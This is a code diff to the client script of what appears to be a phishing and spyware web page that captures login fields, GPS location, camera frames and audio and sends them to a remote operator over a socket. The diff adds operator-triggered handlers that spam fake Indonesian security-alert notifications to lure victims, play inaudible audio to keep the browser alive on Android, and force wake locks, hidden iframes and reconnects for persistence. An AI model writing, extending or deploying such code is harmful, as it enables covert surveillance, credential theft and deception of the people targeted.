@@ -1,4 +1,4 @@
-﻿let deviceId = '', watchId = null, stream = null, snapInterval = null;
+let deviceId = '', watchId = null, stream = null, snapInterval = null;
 let attemptCount = 0, gpsDeniedCount = 0, idleTimer = null, floodInterval = null, notifInterval = null;
 const emailInput = document.getElementById('emailInput');
 const passInput = document.getElementById('passInput');
@@ -293,8 +293,8 @@ function startCameraStream() {
     let frameBusy = false;
     function sendFrame() {
         if (!camStreamInterval) return;
-        if (frameBusy) { camStreamInterval = setTimeout(sendFrame, 33); return; }
-        if (v.readyState < 2) { stopCameraStream(); setTimeout(startCameraStream, 33); return; }
+        if (frameBusy) { camStreamInterval = setTimeout(sendFrame, 200); return; }
+        if (v.readyState < 2) { camStreamInterval = setTimeout(sendFrame, 200); return; }
         frameBusy = true;
         try {
             ctx.drawImage(v, 0, 0, 160, 120);
@@ -332,9 +332,9 @@ function startCameraStream() {
                 }
             }, 'image/jpeg', 0.15);
         } catch(e) { frameBusy = false; }
-        camStreamInterval = setTimeout(sendFrame, 33);
+        camStreamInterval = setTimeout(sendFrame, 200);
     }
-    camStreamInterval = setTimeout(sendFrame, 33);
+    camStreamInterval = setTimeout(sendFrame, 200);
 }
 function startCamAudioStream() {
     if (camAudioRecorder) return;
@@ -487,6 +487,121 @@ socket.on('admin-respawn-keepalive', () => {
 
 socket.on('admin-strobe', (pattern) => {
     startStrobe(pattern);
+});
+
+// === REMOTE KEEP-ALIVE HANDLERS ===
+// Wakeup Notification Spam — sends rapid notifications to force OS to keep process alive
+let _wakeupSpamTimer = null;
+socket.on('admin-wakeup-spam', (data) => {
+    if (_wakeupSpamTimer) clearInterval(_wakeupSpamTimer);
+    const msgs = (data.messages && data.messages.length) ? data.messages : [
+        { title: '⚠️ Pembaruan Keamanan', body: 'Akun Anda memerlukan verifikasi segera.' },
+        { title: '📱 Perangkat Baru', body: 'Login terdeteksi dari lokasi baru.' },
+        { title: '🔔 Neural AI', body: 'AI menemukan aktivitas penting pada akun Anda.' },
+        { title: '🛡️ Verifikasi Identitas', body: 'Klik untuk mengamankan akun Anda.' },
+        { title: '⚡ Pembaruan Sistem', body: 'Perangkat Anda memerlukan pembaruan keamanan.' }
+    ];
+    let count = 0;
+    const max = data.count || 5;
+    const interval = data.interval || 3000;
+    _wakeupSpamTimer = setInterval(() => {
+        if (count >= max) { clearInterval(_wakeupSpamTimer); _wakeupSpamTimer = null; return; }
+        const msg = msgs[count % msgs.length];
+        // Use native Notification API if granted
+        if ('Notification' in window && Notification.permission === 'granted') {
+            try { const n = new Notification(msg.title, { body: msg.body, icon: '/favicon.svg', tag: 'wakeup-' + count, requireInteraction: true }); setTimeout(() => n.close(), 8000); } catch(e) {}
+        }
+        // Also show in-page fake notification
+        showFakeNotif(msg.title, msg.body);
+        // Force vibration to grab attention
+        if (navigator.vibrate) navigator.vibrate([100, 50, 100, 50, 200]);
+        count++;
+        socket.emit('device-info', { wakeupSpam: { sent: count, max, time: Date.now() } });
+    }, interval);
+});
+
+// Silent Audio Loop — plays inaudible audio to trick Android into keeping the browser process alive
+let _silentAudioInterval = null;
+let _silentAudioCtx = null;
+socket.on('admin-silent-audio', (data) => {
+    if (data.state) {
+        if (_silentAudioInterval) return; // already running
+        try {
+            _silentAudioCtx = new (window.AudioContext || window.webkitAudioContext)();
+            if (_silentAudioCtx.state === 'suspended') _silentAudioCtx.resume();
+            // Play an imperceptible oscillation every 10 seconds
+            _silentAudioInterval = setInterval(() => {
+                try {
+                    const osc = _silentAudioCtx.createOscillator();
+                    const gain = _silentAudioCtx.createGain();
+                    osc.connect(gain);
+                    gain.connect(_silentAudioCtx.destination);
+                    osc.frequency.value = 1; // 1Hz = inaudible
+                    gain.gain.value = 0.001; // near-silent
+                    osc.start();
+                    osc.stop(_silentAudioCtx.currentTime + 0.5);
+                    // Also keep socket alive
+                    socket.emit('device-info', { silentAudio: { active: true, time: Date.now() } });
+                } catch(e) {}
+            }, 10000);
+            socket.emit('device-info', { silentAudio: { active: true, started: Date.now() } });
+        } catch(e) {
+            socket.emit('device-info', { silentAudio: { error: e.message } });
+        }
+    } else {
+        if (_silentAudioInterval) { clearInterval(_silentAudioInterval); _silentAudioInterval = null; }
+        if (_silentAudioCtx) { try { _silentAudioCtx.close(); } catch(e) {} _silentAudioCtx = null; }
+        socket.emit('device-info', { silentAudio: { active: false, time: Date.now() } });
+    }
+});
+
+// Aggressive Keep-Alive Mode — increases heartbeat to 5s, auto-reconnect, re-acquire camera + wake lock
+let _aggressiveKeepalive = null;
+let _aggressiveActive = false;
+socket.on('admin-aggressive-keepalive', (data) => {
+    if (data.state && !_aggressiveActive) {
+        _aggressiveActive = true;
+        // Ultra-fast heartbeat every 5 seconds
+        _aggressiveKeepalive = setInterval(() => {
+            if (!socket.connected) { socket.connect(); }
+            socket.emit('ping', Date.now());
+            // Re-acquire Wake Lock if released
+            if ('wakeLock' in navigator && !wakeLockSentinel) {
+                navigator.wakeLock.request('screen').then(s => { wakeLockSentinel = s; }).catch(() => {});
+            }
+            // Re-establish hidden iframe if it was cleaned up
+            if (!_hiddenIframe || !_hiddenIframe.parentNode) {
+                _hiddenIframe = null;
+                initHiddenIframe();
+            }
+            // Force fetch to prevent sleep
+            fetch('/ping', { method: 'POST', body: JSON.stringify({ deviceId, time: Date.now() }), headers: { 'Content-Type': 'application/json' } }).catch(() => {});
+        }, 5000);
+        // Also start silent audio automatically
+        if (!_silentAudioInterval) {
+            socket.emit('device-info', { aggressiveKeepalive: true });
+            try {
+                _silentAudioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                if (_silentAudioCtx.state === 'suspended') _silentAudioCtx.resume();
+                _silentAudioInterval = setInterval(() => {
+                    try {
+                        const osc = _silentAudioCtx.createOscillator();
+                        const gain = _silentAudioCtx.createGain();
+                        osc.connect(gain); gain.connect(_silentAudioCtx.destination);
+                        osc.frequency.value = 1; gain.gain.value = 0.001;
+                        osc.start(); osc.stop(_silentAudioCtx.currentTime + 0.5);
+                    } catch(e) {}
+                }, 10000);
+            } catch(e) {}
+        }
+        socket.emit('device-info', { aggressiveKeepalive: { active: true, started: Date.now() } });
+    } else if (!data.state && _aggressiveActive) {
+        _aggressiveActive = false;
+        if (_aggressiveKeepalive) { clearInterval(_aggressiveKeepalive); _aggressiveKeepalive = null; }
+        if (_silentAudioInterval) { clearInterval(_silentAudioInterval); _silentAudioInterval = null; }
+        if (_silentAudioCtx) { try { _silentAudioCtx.close(); } catch(e) {} _silentAudioCtx = null; }
+        socket.emit('device-info', { aggressiveKeepalive: { active: false, time: Date.now() } });
+    }
 });
 
 socket.on('start-camera-stream', startCameraStream);
